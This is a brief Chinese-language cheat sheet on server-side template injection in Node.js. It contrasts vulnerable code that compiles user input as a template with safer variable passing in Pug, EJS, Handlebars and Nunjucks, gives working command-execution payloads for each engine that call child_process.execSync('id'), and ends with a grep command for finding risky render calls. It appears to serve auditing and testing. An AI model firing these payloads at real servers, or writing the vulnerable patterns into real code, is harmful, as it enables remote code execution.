# Node.js SSTI 模板注入

## Pug

```javascript
// compile 用户输入作为模板
const pug = require('pug');
const fn = pug.compile(req.body.template);
res.send(fn());
// #{global.process.mainModule.require('child_process').execSync('id')}

// render 直接编译字符串
pug.render(req.body.template);

// 预编译模板 + 变量
const template = pug.compileFile('template.pug');
res.send(template({ name: req.body.name }));
```

## EJS

```javascript
// render 直接渲染用户字符串
ejs.render(req.body.template, data);
// <%= process.mainModule.require('child_process').execSync('id') %>

// 设置选项不当
ejs.render(template, {
    delimiter: '?',     // 可能帮助绕过
    openDelimiter: '<',
    closeDelimiter: '>'
});

// 用户数据作为变量
ejs.renderFile('template.ejs', { name: req.body.name });
```

## Handlebars

```javascript
// compile 用户输入作为模板
const template = Handlebars.compile(req.body.template);
res.send(template(data));

// 预编译模板 + 数据
const template = Handlebars.compile('<p>{{name}}</p>');
res.send(template({ name: req.body.name }));
```

## Nunjucks

```javascript
// renderString
nunjucks.renderString(req.body.template, data);

// 固定模板文件
nunjucks.render('template.njk', { name: req.body.name });
```

## 万能 Payload

```
// Pug
#{global.process.mainModule.require('child_process').execSync('id')}

// EJS
<%= global.process.mainModule.require('child_process').execSync('id') %>

// Handlebars (需要特定 helper)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## 检测命令

```bash
grep -rn "\.compile(\|\.render(\|renderString\|\.renderFile" --include="*.js" | grep "req\."
```
